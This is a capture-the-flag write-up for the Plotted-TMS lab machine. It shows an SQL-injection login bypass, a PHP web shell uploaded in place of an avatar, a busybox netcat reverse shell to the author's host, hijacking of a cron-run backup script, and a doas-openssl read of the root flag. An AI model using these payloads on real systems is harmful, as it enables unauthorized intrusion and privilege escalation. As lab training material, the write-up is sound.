# Plotted-TMS

### Plotted-TMS
Nmap scan shows ports 22,80 and 445 open.<br />
Port 80 and 445 are both apache web servers. After some enumeration, port 80 seems a decoy, while using `dirsearch` I found a login page at port 445, specifically at `http://10.10.130.79:445/management/admin/login.php`. <br />
I started enumerating for any possible valid user but found nothing, I checked any comments or hints in the source code but nothing, then I decided to test if it's vulnerable to SQL injection and it actually is! By just prompting `admin'-- -` I was able to log into the admin panel!<br />
I searched online and I found [this exploit](https://www.exploit-db.com/exploits/50221) that's a Remote code execution for TOMS v1.0. I'll do it manually. Basically we can upload a php shell instead of the avatar image: <br />

![image](https://github.com/user-attachments/assets/2cd095a0-2b36-4a81-a7ef-6955254ded87)<br />
I created a file named `rev.php` with the following code: `<?php system($_GET['cmd']); ?>`. <br />
After the update, just take the link of the image: <br />
![image](https://github.com/user-attachments/assets/83d7eaa9-170b-4b94-ac38-24e00bf97af1)<br />
And then browse it and add `?cmd=whoami`: <br />
![image](https://github.com/user-attachments/assets/d4690171-c3de-47af-974f-df12d2c47bca)<br />
Now to spawn a reverse shell, I'll use `busybox nc my_IP my_PORT -e sh`. <br />
For privesc, I have to access the `plot_admin` account. After some enumeration I found a .sh file inside `/var/www/scripts` called `backup.sh`: <br />
![image](https://github.com/user-attachments/assets/9897e5bd-0bef-41d0-8bed-ce7ff0b71b55)<br />
There's a cronjob that executes this script every minute. This is the content of the script: <br />
![image](https://github.com/user-attachments/assets/2a959baa-3664-4b82-931d-a228d645beb0)<br />
But that is not important. What matters is that the directory `/var/www/scripts` is owned by me, www-data. This means that I can remove whatever file is inside this folder, and then create new ones. So I just run `rm backup.sh`, and now i'll create a new file named `backup.sh` with the following content `busybox nc my_IP my_PORT -e sh`, make it executable and then wait a few seconds: <br />
![image](https://github.com/user-attachments/assets/43ae46c9-be89-4be7-97e2-47a9f858f214)<br />
At this point I started looking for ways to become root. I run linpeas and found a `doas` configuration. 
![image](https://github.com/user-attachments/assets/651d6458-f2af-461b-97ef-524765303053)<br />
I can run `openssl` as root by running `doas openssl`. After trying to become root, and failing for some reason, I just decided to use the root privileges on openssl to read the root flag. Specifically I found this exploit on [gtfobins](https://gtfobins.github.io/gtfobins/openssl/): <br />
![image](https://github.com/user-attachments/assets/1ee1ac77-cf26-46c0-9acc-277b481bddea)<br />
I just run `doas openssl enc -in "/root/root.txt"` and got the flag. 







